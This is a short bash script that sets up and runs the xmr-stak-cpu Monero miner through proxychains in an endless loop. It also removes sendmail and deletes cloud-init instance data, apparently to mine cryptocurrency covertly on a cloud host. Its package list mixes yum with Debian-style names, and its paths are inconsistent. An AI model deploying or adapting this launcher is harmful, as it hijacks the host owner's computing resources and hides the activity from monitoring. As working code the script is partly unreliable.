#!/bin/bash
sudo yum remove sendmail -y
sudo yum install git build-essential automake libjansson-dev libgmp-dev libcurl4-openssl-dev libssl-dev pthreads zlib openssl-devel gcc-c++ curl-devel libmpc-devel gmp  gmp-devel  mpfr  mpfr-devel  libmpc  libmpc-devel -y
rm -rf /var/lib/cloud/instance/*

sudo chmod +x /m/test01/proxychains/proxychains4
sudo chmod +x /m/test01/xmr/xmr-stak-cpu

while true; do
cd /m/test01/xmr
  sudo /m/test01/proxychains-ng/proxychains4 -f /m/test01/proxychains/src/proxychains.conf /m/test01/xmr/xmr-stak-cpu
done
